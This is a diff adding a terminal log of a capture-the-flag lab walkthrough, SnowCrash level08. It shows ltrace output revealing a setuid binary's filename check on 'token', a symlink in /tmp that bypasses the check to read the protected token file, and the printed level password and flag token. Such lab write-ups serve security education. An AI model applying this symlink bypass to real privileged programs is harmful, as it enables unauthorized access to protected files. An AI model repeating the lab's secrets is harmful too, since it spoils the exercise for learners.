@@ -1,0 +1,32 @@
+level08@SnowCrash:~$ ls -l
+	total 16
+	-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
+	-rw-------  1 flag08 flag08    26 Mar  5  2016 token
+
+level08@SnowCrash:~$ ltrace ./level08 /tmp/token1
+	__libc_start_main(0x8048554, 2, 0xbffff7e4, 0x80486b0, 0x8048720 <unfinished ...>
+	strstr("/tmp/token1", "token")                                          = "token1"
+	printf("You may not access '%s'\n", "/tmp/token1"You may not access '/tmp/token1'
+	)                      = 33
+	exit(1 <unfinished ...>
+	+++ exited (status 1) +++
+
+level08@SnowCrash:~$ ltrace ./level08 /tmp/test
+	__libc_start_main(0x8048554, 2, 0xbffff7e4, 0x80486b0, 0x8048720 <unfinished ...>
+	strstr("/tmp/test", "token")                                            = NULL
+	open("/tmp/test", 0, 014435162522)                                      = -1
+	err(1, 0x80487b2, 0xbffff90c, 0xb7fe765d, 0xb7e3ebaflevel08: Unable to open /tmp/test: No such file or directory
+	<unfinished ...>
+	+++ exited (status 1) +++
+
+level08@SnowCrash:~$ ln -s ~/token /tmp/test
+level08@SnowCrash:~$ ./level08 /tmp/test
+	quif5eloekouj29ke0vouxean
+
+level08@SnowCrash:~$ su flag08
+	Password:
+	Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+	Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+
+flag08@SnowCrash:~$ su level09
